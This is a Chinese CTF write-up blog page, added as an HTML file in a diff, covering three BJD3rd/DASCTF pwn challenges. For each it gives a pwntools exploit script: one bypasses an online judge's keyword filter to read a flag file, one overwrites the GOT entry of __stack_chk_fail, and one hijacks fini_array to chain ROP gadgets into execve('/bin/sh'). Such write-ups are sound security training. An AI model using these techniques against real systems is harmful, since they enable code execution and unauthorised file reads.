@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/blog/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/blog/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/blog/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/blog/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/blog/css/main.css">
+
+
+<link rel="stylesheet" href="/blog/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/blog/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="PWNTaQini OJ 0没附件，盲打，nc上去。一个OJ系统，可以编译运行写的C代码，提示输出Hello TaQini，按要求写一段C后给了flag的路劲/home/ctf/flag然后很自然的尝试了system(“cat /home/ctf/flag”)发现过滤了flag和system，exec类的函数。然后一个劲的写漏洞程序想着getshell，现在想想真是SB。直接读文件就完事了。">
+<meta name="keywords" content="2020,BJD3rdCTF,DASCTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BJD3rd&amp;DASCTF-WriteUp">
+<meta property="og:url" content="http://yoursite.com/2020/05/26/BJD3rnd-DASCTF-WriteUp/index.html">
+<meta property="og:site_name" content="Sncker&#39;s blog - qq948375961">
+<meta property="og:description" content="PWNTaQini OJ 0没附件，盲打，nc上去。一个OJ系统，可以编译运行写的C代码，提示输出Hello TaQini，按要求写一段C后给了flag的路劲/home/ctf/flag然后很自然的尝试了system(“cat /home/ctf/flag”)发现过滤了flag和system，exec类的函数。然后一个劲的写漏洞程序想着getshell，现在想想真是SB。直接读文件就完事了。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200526203246.png">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200526205834.png">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200527094827.png">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200527165533.png">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200527165720.png">
+<meta property="og:updated_time" content="2020-05-27T09:02:21.384Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="BJD3rd&amp;DASCTF-WriteUp">
+<meta name="twitter:description" content="PWNTaQini OJ 0没附件，盲打，nc上去。一个OJ系统，可以编译运行写的C代码，提示输出Hello TaQini，按要求写一段C后给了flag的路劲/home/ctf/flag然后很自然的尝试了system(“cat /home/ctf/flag”)发现过滤了flag和system，exec类的函数。然后一个劲的写漏洞程序想着getshell，现在想想真是SB。直接读文件就完事了。">
+<meta name="twitter:image" content="https://gitee.com/sncker/resource/raw/master/image/20200526203246.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/05/26/BJD3rnd-DASCTF-WriteUp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>BJD3rd&DASCTF-WriteUp | Sncker's blog - qq948375961</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/blog/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Sncker's blog - qq948375961</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">情绪不稳定，要做就做大事情。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/blog/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/blog/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/blog/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/26/BJD3rnd-DASCTF-WriteUp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="http://q1.qlogo.cn/g?b=qq&nk=948375961&s=640">
+      <meta itemprop="name" content="SNCKER">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sncker's blog - qq948375961">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          BJD3rd&DASCTF-WriteUp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-05-26 20:25:00" itemprop="dateCreated datePublished" datetime="2020-05-26T20:25:00+08:00">2020-05-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-05-27 17:02:21" itemprop="dateModified" datetime="2020-05-27T17:02:21+08:00">2020-05-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/blog/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/blog/categories/CTF/WriteUp/" itemprop="url" rel="index"><span itemprop="name">WriteUp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="TaQini-OJ-0"><a href="#TaQini-OJ-0" class="headerlink" title="TaQini OJ 0"></a>TaQini OJ 0</h2><p>没附件，盲打，nc上去。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200526203246.png" alt><br>一个OJ系统，可以编译运行写的C代码，提示输出Hello TaQini，按要求写一段C后给了flag的路劲/home/ctf/flag<br>然后很自然的尝试了system(“cat /home/ctf/flag”)发现过滤了flag和system，exec类的函数。然后一个劲的写漏洞程序想着getshell，现在想想真是SB。直接读文件就完事了。  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">"debug"</span>, arch=<span class="string">"amd64"</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"183.129.189.60"</span>, <span class="number">10075</span>)</span><br><span class="line"></span><br><span class="line">program = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">	char buff[128]=&#123;0&#125;, file[128]=&#123;0&#125;;</span></span><br><span class="line"><span class="string">	scanf("%s", file);</span></span><br><span class="line"><span class="string">	FILE* fp = fopen(file, "r");</span></span><br><span class="line"><span class="string">	fscanf(fp, "%s", buff);</span></span><br><span class="line"><span class="string">	printf("%s", buff);</span></span><br><span class="line"><span class="string">	return 0</span></span><br><span class="line"><span class="string">&#125;@</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">"'@')"</span>, program)</span><br><span class="line">io.sendlineafter(<span class="string">"(Y/n)"</span>, <span class="string">"/home/ctf/flag"</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>用输入来绕过flag的过滤。<br>看其它师傅的wp用包含秒了两道OJ题。。。  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"/home/ctf/f\</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">lag"</span>@</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Memory-Monster-I"><a href="#Memory-Monster-I" class="headerlink" title="Memory Monster I"></a>Memory Monster I</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200526205834.png" alt><br>任意地址写。找了一下发现system(“/bin/sh”)。想办法跳过去执行。<br>checksec开了Canary保护，利用任意地址写Hajack掉got里的__stack_chk_fail地址，然后覆盖canary即可.  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">"debug"</span>, arch=<span class="string">"amd64"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"Memory_Monster_I"</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"Memory_Monster_I"</span>)</span><br><span class="line"><span class="comment">#io = remote("183.129.189.60", 10081)</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendafter(<span class="string">"addr:"</span>, p64(elf.got[<span class="string">'__stack_chk_fail'</span>]) + <span class="string">'a'</span>*<span class="number">0x30</span>)</span><br><span class="line">io.sendafter(<span class="string">"data:"</span>, p64(<span class="number">0x000000000040124A</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Memory-Monster-II"><a href="#Memory-Monster-II" class="headerlink" title="Memory_Monster_II"></a>Memory_Monster_II</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200527094827.png" alt><br>静态编译去符号。字符串窗口找类似”addr:”这种串，跟着引用找到main函数。看一下和第一题是差不多的，任意地址写。checksec发现只有NX，没开canary。但仔细看一下rbp-8的v5，在return前有个判断，其实就是canary。没check出来估计是去了符号的原因。按第一题的做法也是可以的，但是我没有，因为找__stack_chk_fail函数真是太可怕了。<br>这里就是劫持fini_array。<br>原理就是，首先程序入口并不是main函数，平时调试都会发现main的返回地址在libc_start_main里，然后它的函数原型是这样的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__libc_start_main(main,argc,argv&amp;env,init,fini,rtld_fini)</span><br></pre></td></tr></table></figure>
+
+<p>参数有三个函数指针，main,init,fini，其中init是main前调用的，fini是main后调用的。<br>而我们利用的点就在fini里边。fini调用的函数是__libc_csu_fini，它里面有个fini_array，存放两个函数指针，顺序是先执行fini_array[1]，再执行fini_array[0]。<br>我们利用的思路是：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fini_array[0] = __libc_csu_fini  </span><br><span class="line">fini_array[1] = main</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以循环执行main，解决数据写入量少的问题。<br>然后就是部署Rop。One_gadget梭不出来，自己ROPgadget一个个找。<br>找完之后将Rop部署在fini_array+0x10的地方，然后打断循环，并将栈迁移到到我们部署的Rop上。  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fini_array[0] = gadget: leave;ret</span><br><span class="line">fini_array[1] = gadget: ret</span><br></pre></td></tr></table></figure>
+
+<p>main执行完就会执行fini_array[0]，leave之后rsp就到了fini_array+0x8，这样放一个ret到<br>fini_array+0x8就可以执行fini_array+0x10的Rop_chain上了。<br>先找__libc_csu_fini的地址，跟一个start函数，按照参数顺序对应的r8寄存器。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200527165533.png" alt><br>跟进找fini_array的地址。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200527165720.png" alt><br>静态链接找gadget随便找。0x3b号系统调用execve(“/bin/sh”, 0, 0)<br>最后代码  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(log_level="debug", arch="amd64")</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"Memory_Monster_II"</span>)</span><br><span class="line"><span class="comment">#io = remote("183.129.189.60", 10100)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">fini_array = <span class="number">0x4b80b0</span></span><br><span class="line">libc_csu_fini = <span class="number">0x402cb0</span></span><br><span class="line">bin_sh_addr = <span class="number">0x0000000000492895</span></span><br><span class="line">main_addr = <span class="number">0x0000000000401C1D</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401746</span></span><br><span class="line">pop_rdx_rsi = <span class="number">0x000000000044baf9</span></span><br><span class="line">syscall_0x3b = <span class="number">0x000000000046efe0</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000401cf3</span></span><br><span class="line">ret = <span class="number">0x0000000000401cf4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">"addr:"</span>, p64(fini_array))</span><br><span class="line">io.sendafter(<span class="string">"data:"</span>, p64(libc_csu_fini)+p64(main_addr))</span><br><span class="line"></span><br><span class="line">rop_chain = [</span><br><span class="line">	p64(pop_rdi),</span><br><span class="line">	p64(bin_sh_addr),</span><br><span class="line">	p64(pop_rdx_rsi),</span><br><span class="line">	p64(<span class="number">0</span>),</span><br><span class="line">	p64(<span class="number">0</span>),</span><br><span class="line">	p64(syscall_0x3b)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(rop_chain)):</span><br><span class="line">	io.sendafter(<span class="string">"addr:"</span>, p64(fini_array+<span class="number">0x10</span>+i*<span class="number">8</span>))</span><br><span class="line">	io.sendafter(<span class="string">"data:"</span>, rop_chain[i])</span><br><span class="line">	</span><br><span class="line">io.sendafter(<span class="string">"addr:"</span>, p64(fini_array))</span><br><span class="line">io.sendafter(<span class="string">"data:"</span>, p64(leave_ret) + p64(ret))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/blog/tags/2020/" rel="tag"># 2020</a>
+              <a href="/blog/tags/BJD3rdCTF/" rel="tag"># BJD3rdCTF</a>
+              <a href="/blog/tags/DASCTF/" rel="tag"># DASCTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/blog/2020/05/05/De1CTF-2020-WriteUp/" rel="prev" title="De1CTF2020-WriteUp">
+      <i class="fa fa-chevron-left"></i> De1CTF2020-WriteUp
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-number">1.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#TaQini-OJ-0"><span class="nav-number">1.1.</span> <span class="nav-text">TaQini OJ 0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Memory-Monster-I"><span class="nav-number">1.2.</span> <span class="nav-text">Memory Monster I</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Memory-Monster-II"><span class="nav-number">1.3.</span> <span class="nav-text">Memory_Monster_II</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="SNCKER"
+      src="http://q1.qlogo.cn/g?b=qq&nk=948375961&s=640">
+  <p class="site-author-name" itemprop="name">SNCKER</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/blog/archives/">
+        
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/blog/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">SNCKER</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/blog/lib/anime.min.js"></script>
+  <script src="/blog/lib/velocity/velocity.min.js"></script>
+  <script src="/blog/lib/velocity/velocity.ui.min.js"></script>
+<script src="/blog/js/utils.js"></script><script src="/blog/js/motion.js"></script>
+<script src="/blog/js/schemes/pisces.js"></script>
+<script src="/blog/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/blog/js/love.js"></script>
+</body>
+</html>
